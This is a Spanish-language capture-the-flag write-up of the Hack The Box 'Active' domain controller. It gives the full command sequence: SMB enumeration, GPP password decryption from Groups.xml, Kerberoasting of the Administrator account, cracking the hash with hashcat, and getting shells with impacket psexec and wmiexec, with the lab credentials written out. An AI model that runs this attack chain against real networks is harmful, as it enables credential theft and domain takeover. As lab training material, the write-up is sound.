![Active (1)](https://github.com/user-attachments/assets/a0ee55d3-ffbf-4642-a114-e1aca2f30836)

Comenzamos enumerando puertos abiertos con nmap.

``sudo nmap 10.10.10.100 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250313105053](https://github.com/user-attachments/assets/43fe3451-31a8-4d10-bf9b-ab638880287d)

Dados los puertos abiertos, tiene bastante pinta de que es un DC. No obstante, vamos a ver qué servicios y versiones están corriendo en estos puertos.

``nmap 10.10.10.100 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49163,49174,49176 -oN target``

![Pasted image 20250313105216](https://github.com/user-attachments/assets/691c6de4-1102-426b-a453-331ef7769073)

Confirmamos que es un DC. A su vez, podemos empezar a ver cositas, como que el dominio es active.htb. Para recopilar un poquito más de información vamos a hacer uso de netexec.

``netexec smb 10.10.10.100``

![Pasted image 20250313105324](https://github.com/user-attachments/assets/d9c8b691-10ab-4097-9e7c-e6c6764f03d7)

Confirmamos que el dominio es active.htb, que la máquina se llama dc y que tiene un WinServer 2008.

Añadimos esta información al /etc/hosts.

![active etchosts](https://github.com/user-attachments/assets/13591f9d-94c3-4bbe-ad59-c2e98c30f03e)


Para continuar enumerando información que pueda ser de utilidad, vamos a intentar ver qué recursos se están compartiendo:

``netexec smb 10.10.10.100 -u '' -p '' --shares``

![Pasted image 20250313105631](https://github.com/user-attachments/assets/b0ac3808-30c1-4906-bb42-ea78c529c128)

Tenemos permisos de lectura en el recurso Replication, lo cual es llamativo. Vamos a echar un vistazo con null sesion.

``smbclient //10.10.10.100/REPLICATION -N``

![Pasted image 20250313105732](https://github.com/user-attachments/assets/a6766483-809e-4362-9980-871fa73e4d44)


active.htb -> Parece la estructura de SYSVOL

Para echarle un ojo más a fondo, vamos a traernos todo lo existente a la máquina atacante.

``recurse ON``

``prompt OFF``

``mget *``

A medida que se van descargando, si nos fijamos, hay algo que llama la atención:

![Pasted image 20250313110008](https://github.com/user-attachments/assets/445fc4b7-ad78-4b6f-9e18-6d7145aaa9ff)

groups.xml. Este archivo es muy jugoso porque a veces tiene contraseñas.

Si queremos ver la estructura de todos los datos descargados:

``tree .``

![Pasted image 20250313110146](https://github.com/user-attachments/assets/36f7f9ba-e4f8-412d-bad0-07a559d358e5)


Y si echamos un vistazo a Groups.xml : 

![Pasted image 20250313112056](https://github.com/user-attachments/assets/b5212019-0655-4aea-8ac4-f692c9609db0)


Vemos claramente una referencia al usuario SVC_TGS y la contraseña encriptada. Para poder romperla hacemos uso de la utilidad ``gpp-decrypt``.

``gpp-decrypt 'CLAVE'``

![Pasted image 20250313110557](https://github.com/user-attachments/assets/5912c20f-0c5f-4546-b198-6bdd4d4749f8)

Tenemos la contraseña, y por tanto, las posibles credenciales -> SVC_TGS : GPPstillStandingStrong2k18

Vamos a ver si son válidas con netexec.

``netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'``

![Pasted image 20250313112339](https://github.com/user-attachments/assets/a5c35665-312e-4765-a205-5eb2844b4152)

Nos pone [+], por lo que son credenciales válidas. Una vez sabemos esto, podemos seguir husmeando para ver qué se esta compartiendo para este usuario por SMB:

``netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares``

![Pasted image 20250313112616](https://github.com/user-attachments/assets/549749d1-e6be-416f-8217-3ebeb729393b)

Lo único que puede parecer interesante, a priori, es el directorio Users. Si nos conectamos con smbclient con estas credenciales, vemos que es el directorio C:\Users. De hecho, podemos acceder a user.txt dentro del directorio SVC_TGS, pero en un escenario como el de la OSCP no sirve con obtener la flag de esta forma porque no tenemos una consola interactiva.

![Pasted image 20250313113410](https://github.com/user-attachments/assets/b6d57e01-b7de-4d52-9259-0a1bd3610480)


Vale, tenemos unas credenciales válidas, pero no tenemos forma de conectarnos: no hay winRM, no hay RDP y no podemos hacer uso de psexec/wmiexec por falta de privilegios.

Como tenemos credenciales, podemos probar kerberoasting para ver si capturamos algún hash de otro usuario:

``impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS``
-> Password: GPPstillStandingStrong2k18

![Pasted image 20250313113615](https://github.com/user-attachments/assets/f4706d60-a0de-41cf-9c9a-91cafd9cb652)

Ojo. Tenemos el TGS del usuario Administrator. Si conseguimos descifrarlo, está hecho. Nos copiamos el contenido en un archivo. Ej: admintgs

![Pasted image 20250313113715](https://github.com/user-attachments/assets/8227a23b-c816-423c-ad2a-4005e2827743)


Buscamos en hashcat el código para el TGS-REP (``krb5tgs$23$``):

``hashcat --help | grep -i "kerberos"

![Pasted image 20250313113850](https://github.com/user-attachments/assets/b2a5f526-064c-4dc2-8aee-580aefedcf44)


Lanzamos hashcat con rockyou como diccionario.

``hashcat -m 13100 admintgs /usr/share/wordlists/rockyou.txt --force``

![Pasted image 20250313114050](https://github.com/user-attachments/assets/59f199dd-b2a9-40a7-bfc7-c3b4a81a97d9)

Lo ha sacado. Tenemos contraseña del usuario Administrator : Ticketmaster1968

Validamos credenciales con netexec:

``netexec smb 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'``

![Pasted image 20250313114156](https://github.com/user-attachments/assets/1be287e2-09ac-4782-a19a-8cf09a160c3b)


Nos aparece pwned para smb, por lo que podríamos utilizar wmiexec (para acceder como administrator) y psexec (para acceder como nt authority\system):

Ejemplos:

``impacket-wmiexec Administrator@10.10.10.100``

-> Password: Ticketmaster1968

![Pasted image 20250313114352](https://github.com/user-attachments/assets/2cca26a5-0223-4896-8e68-da09618d474c)


``impacket-psexec Administrator@10.10.10.100``

-> Password: Ticketmaster1968

![Pasted image 20250313114422](https://github.com/user-attachments/assets/30e28b9a-5b7b-40e2-a6b5-2e79a666ea4d)



Recogemos la flag de usuario en: C:\Users\SVC_TGS\Desktop:

![Pasted image 20250313114638](https://github.com/user-attachments/assets/76f66d12-22bb-4793-83fb-eb4b9e74e767)


Y por último, recogemos la flag de Administrador en C:\Users\Administrator\Desktop:

![Pasted image 20250313114758](https://github.com/user-attachments/assets/a314fe8e-b238-46cb-b847-ed247098f76e)
